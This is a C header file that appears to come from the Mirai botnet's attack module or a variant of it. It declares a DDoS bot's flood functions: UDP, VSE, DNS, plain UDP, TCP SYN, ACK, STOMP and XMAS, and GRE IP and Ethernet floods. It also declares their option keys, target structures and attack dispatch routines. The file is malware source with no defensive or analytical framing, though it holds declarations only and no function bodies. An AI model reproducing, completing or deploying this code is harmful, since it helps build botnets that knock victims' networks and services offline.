#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define ATTACK_CONCURRENT_MAX 8

struct attack_target
{
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option
{
    char *val;
    uint8_t key;
};

typedef void (*ATTACK_FUNC) (int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

#define ATK_VEC_UDP 0
#define ATK_VEC_VSE 1
#define ATK_VEC_DNS 2
#define ATK_VEC_SYN 3
#define ATK_VEC_ACK 4
#define ATK_VEC_STOMP 5
#define ATK_VEC_GREIP 6
#define ATK_VEC_GREETH 7
#define ATK_VEC_UDP_PLAIN 8
#define ATK_VEC_XMAS 9

#define ATK_OPT_PAYLOAD_SIZE 0  
#define ATK_OPT_PAYLOAD_RAND 1  
#define ATK_OPT_IP_TOS 2  
#define ATK_OPT_IP_IDENT 3  
#define ATK_OPT_IP_TTL 4  
#define ATK_OPT_IP_DF 5  
#define ATK_OPT_SPORT 6  
#define ATK_OPT_DPORT 7  
#define ATK_OPT_DOMAIN 8  
#define ATK_OPT_DNS_HDR_ID 9  
#define ATK_OPT_URG 10 
#define ATK_OPT_ACK 11 
#define ATK_OPT_PSH 12 
#define ATK_OPT_RST 13 
#define ATK_OPT_SYN 14 
#define ATK_OPT_FIN 15 
#define ATK_OPT_SEQRND 16 
#define ATK_OPT_ACKRND 17 
#define ATK_OPT_GRE_CONSTIP 18 
#define ATK_OPT_SOURCE 19

struct attack_method
{
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data
{
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};
struct attack_xmas_data
{
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

void attack_udp_generic(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_dns(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_tcp_syn(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_stomp(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_xmas(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_gre_ip(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_gre_eth(int, uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
